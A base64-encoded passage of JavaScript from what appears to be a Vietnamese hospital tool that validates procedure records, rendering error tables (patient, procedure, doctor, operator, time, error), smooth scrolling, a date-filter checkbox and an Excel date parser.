G7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCg0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnByb2NlZHVyZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCgkJCQk8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iPiR7ZXJyb3IuZGV0YWlscy5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5vcGVyYXRvciA/IGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgOiAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRldGFpbHMubmdheVRodWNIaWVuIHx8IChlcnJvci5kZXRhaWxzLmRhdGUgfHwgJ0tow7RuZyBjw7MnKX0gPGJyLz4kew0KICAgICAgICAgICAgICAgICAgICBlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsycNCiAgICAgICAgICAgICAgICB9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICA8Yj48Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWQgPyBgJHtlcnJvci5kZXRhaWxzLmFjdHVhbH0gcGjDunQ8L2ZvbnQ+PC9iPiAoVOG7kWkgdGhp4buDdTogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCg0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZEVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgDQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGlmIChlcnJvci5kZXRhaWxzKSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucHJvY2VkdXJlIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gICAoVOG7kWkgdGhp4buDdTogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI2IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQogICAgICAgIGZ1bmN0aW9uIGxvZ0Vycm9yKG1lc3NhZ2UsIHJvdyA9IG51bGwsIGRldGFpbHMgPSBudWxsKSB7DQogICAgICAgICAgICBlcnJvckxvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICBtZXNzYWdlLA0KICAgICAgICAgICAgICAgIHJvdywNCiAgICAgICAgICAgICAgICBkZXRhaWxzLA0KICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0xvY2FsZVRpbWVTdHJpbmcoKSwNCiAgICAgICAgICAgICAgICB1c2VyOiBjdXJyZW50VXNlcg0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCg0KZnVuY3Rpb24gZGlzcGxheUVycm9ycygpIHsNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIA0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICANCiAgICAgICAgLy8gTuG6v3Uga2jDtG5nIGPDsyBs4buXaSwgY3Xhu5luIHh14buRbmcgcGjhuqduIEvhur90IFF14bqjIEtp4buDbSBUcmENCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uICYmIHJlc3VsdFNlY3Rpb24uc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyB04burbmcgbOG7l2kNCiAgICBlcnJvckxvZy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaWYgKGVycm9yLmRldGFpbHMpIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gICAoVOG7kWkgdGhp4buDdTogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI2IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIEN14buZbiB4deG7kW5nIHBo4bqnbiBs4buXaSBu4bq/dSBjw7MNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgY29uc3QgZXJyb3JTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpOw0KICAgICAgICBpZiAoZXJyb3JTZWN0aW9uKSB7DQogICAgICAgICAgICBzbW9vdGhTY3JvbGxUbyhlcnJvclNlY3Rpb24sIC0xMzApOw0KICAgICAgICB9DQogICAgfSwgMzAwKTsNCn0NCg0KLy8gSMOgbSBjdeG7mW4gbcaw4bujdCB04buVbmcgcXXDoXQNCmZ1bmN0aW9uIHNtb290aFNjcm9sbFRvKGVsZW1lbnQsIG9mZnNldCA9IDApIHsNCiAgICBlbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgDQogICAgY29uc3QgZWxlbWVudFBvc2l0aW9uID0gZWxlbWVudC5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKS50b3A7DQogICAgY29uc3Qgb2Zmc2V0UG9zaXRpb24gPSBlbGVtZW50UG9zaXRpb24gKyB3aW5kb3cucGFnZVlPZmZzZXQgLSBvZmZzZXQ7DQogICAgDQogICAgY29uc3QgZHVyYXRpb24gPSAxNTAwOw0KICAgIGNvbnN0IHN0YXJ0ID0gd2luZG93LnBhZ2VZT2Zmc2V0Ow0KICAgIGNvbnN0IHN0YXJ0VGltZSA9IHBlcmZvcm1hbmNlLm5vdygpOw0KICAgIA0KICAgIGZ1bmN0aW9uIHNjcm9sbFN0ZXAodGltZXN0YW1wKSB7DQogICAgICAgIGNvbnN0IGVsYXBzZWQgPSB0aW1lc3RhbXAgLSBzdGFydFRpbWU7DQogICAgICAgIGNvbnN0IHByb2dyZXNzID0gTWF0aC5taW4oZWxhcHNlZCAvIGR1cmF0aW9uLCAxKTsNCiAgICAgICAgY29uc3QgZWFzaW5nID0gZWFzZUluT3V0Q3ViaWMocHJvZ3Jlc3MpOw0KICAgICAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgc3RhcnQgKyAob2Zmc2V0UG9zaXRpb24gLSBzdGFydCkgKiBlYXNpbmcpOw0KICAgICAgICANCiAgICAgICAgaWYgKHByb2dyZXNzIDwgMSkgew0KICAgICAgICAgICAgd2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZShzY3JvbGxTdGVwKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBlYXNlSW5PdXRDdWJpYyh0KSB7DQogICAgICAgIHJldHVybiB0IDwgMC41ID8gNCAqIHQgKiB0ICogdCA6IDEgLSBNYXRoLnBvdygtMiAqIHQgKyAyLCAzKSAvIDI7DQogICAgfQ0KICAgIA0KICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGVsZW1lbnQuY2xhc3NMaXN0LnJlbW92ZSgnaGlnaGxpZ2h0LWVycm9yLXNlY3Rpb24nKTsNCiAgICB9LCAyMDAwKTsNCn0NCg0KDQogLy8gPT09PT09IELhuq5UIFPhu7AgS0nhu4ZOIENIRUNLQk9YICJDaOG7iSBoaeG7g24gdGjhu4sgbmfDoHkgc+G6r2MgdGh14buRYyBs4buXaSIgPT09PT09DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0hlcmJFcnJvckRheXNDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBzaG93T25seUVycm9yRGF5cyA9IHRoaXMuY2hlY2tlZDsNCg0KICAgIC8vIDEuIEzhuqV5IHRvw6BuIGLhu5kgbmfDoHkgdOG7qyBhbGxQcm9jZWR1cmVzDQogICAgY29uc3QgYWxsRGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXTsNCg0KICAgIC8vIDIuIE7hur91IGLhuq10IGNoZWNrYm94IC0+IGNo4buJIGdp4buvIG5nw6B5IGPDsyBz4bqvYyB0aHXhu5FjIGzhu5dpDQogICAgbGV0IGRhdGVzVG9TaG93ID0gYWxsRGF0ZXM7DQogICAgaWYgKHNob3dPbmx5RXJyb3JEYXlzKSB7DQogICAgICAgIGNvbnN0IGhlcmJEYXRlcyA9IG5ldyBTZXQoKHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXSkubWFwKGggPT4gaC5kYXRlKSk7DQogICAgICAgIGRhdGVzVG9TaG93ID0gYWxsRGF0ZXMuZmlsdGVyKGQgPT4gaGVyYkRhdGVzLmhhcyhkKSk7DQogICAgfQ0KDQogICAgLy8gMy4gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIEdp4budIHRy4buRbmcgKGZpbHRlckRhdGUpDQogICAgY29uc3QgZmlsdGVyRGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk7DQogICAgaWYgKGZpbHRlckRhdGVTZWxlY3QpIHsNCiAgICAgICAgZmlsdGVyRGF0ZVNlbGVjdC5pbm5lckhUTUwgPSBgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+YCArDQogICAgICAgICAgICBkYXRlc1RvU2hvdy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIH0NCg0KICAgIC8vIDQuIEPhuq1wIG5o4bqtdCBkcm9wZG93biBT4bqvYyB0aHXhu5FjIHRoYW5nIChoZXJiRGF0ZUZpbHRlcikNCiAgICBjb25zdCBoZXJiRGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGlmIChoZXJiRGF0ZVNlbGVjdCkgew0KICAgICAgICBoZXJiRGF0ZVNlbGVjdC5pbm5lckhUTUwgPSBgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+YCArDQogICAgICAgICAgICBkYXRlc1RvU2hvdy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIH0NCn0pOw0KDQoNCiAgICAgICAgZnVuY3Rpb24gcGFyc2VEYXRlVGltZShkYXRldGltZVN0ciwgcm93SW5kZXgpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgaWYgKCFkYXRldGltZVN0cikgew0KICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIGRhdGV0aW1lU3RyID09PSAnbnVtYmVyJykgew0KICAgICAgICAgICAgICAgICAgICBjb25zdCBleGNlbERhdGUgPSBuZXcgRGF0ZShNYXRoLnJvdW5kKChkYXRldGltZVN0ciAtIDI1NTY5KSAqIDg2NDAwICogMTAwMCkpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXkgPSBleGNlbERhdGUuZ2V0RGF0ZSgpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtb250aCA9IGV4Y2VsRGF0ZS5nZXRNb250aCgpICsgMTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgeWVhciA9IGV4Y2VsRGF0ZS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBob3VycyA9IGV4Y2VsRGF0ZS5nZXRIb3VycygpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtaW51dGVzID0gZXhjZWxEYXRlLmdldE1pbnV0ZXMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kcyA9IGV4Y2VsRGF0ZS5nZXRTZWNvbmRzKCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iajogZXhjZWxEYXRlLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZUtleTogYCR7ZGF5fS8ke21vbnRofS8ke3llYXJ9YCwNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXM6IGhvdXJzICogNjAgKyBtaW51dGVzLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kczogaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlUaW1lOiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7c2Vjb25kcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YA0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ3N0cmluZycpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IGRhdGVQYXJ0LCB0aW1lUGFydCA9ICcwMDowMDowMCc7DQogICAgICAgICAgICAgICAgICAgIGlmIChkYXRldGltZVN0ci5pbmNsdWRlcygnICcpKSBbZGF0ZVBhcnQsIHRpbWVQYXJ0XSA9IGRhdGV0aW1lU3RyLnNwbGl0KCcgJyk7DQogICAgICAgICAgICAgICAgICAgIGVsc2UgZGF0ZVBhcnQgPSBkYXRldGltZVN0cjsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBkYXksIG1vbnRoLCB5ZWFyOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZVBhcnQuaW5jbHVkZXMoJy8nKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGFydHMgPSBkYXRlUGFydC5zcGxpdCgnLycpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMykgW2RheSwgbW9udGgsIHllYXJdID0gcGFydHMubWFwKE51bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChwYXJ0cy5sZW5ndGggPT09IDIpIFtkYXksIG1vbnRoXSA9IHBhcnRzLm1hcChOdW1iZXIpLCB5ZWFyID0gbmV3IERhdGUoKS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCctJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy0nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFt5ZWFyLCBtb250aCwgZGF5XSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHRocm93IG5ldyBFcnJvcignxJDhu4tuaCBk4bqhbmcgbmfDoHkga2jDtG5nIMSRxrDhu6NjIGjhu5cgdHLhu6MnKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihkYXkpIHx8IGlzTmFOKG1vbnRoKSB8fCBpc05hTih5ZWFyKSB8fCBkYXkgPCAxIHx8IGRheSA+IDMxIHx8IG1vbnRoIDwgMSB8fCBtb250aCA+IDEyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0dpw6EgdHLhu4sgbmfDoHkga2jDtG5nIGjhu6NwIGzhu4cnKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbGV0IGhvdXJzID0gMCwgbWludXRlcyA9IDAsIHN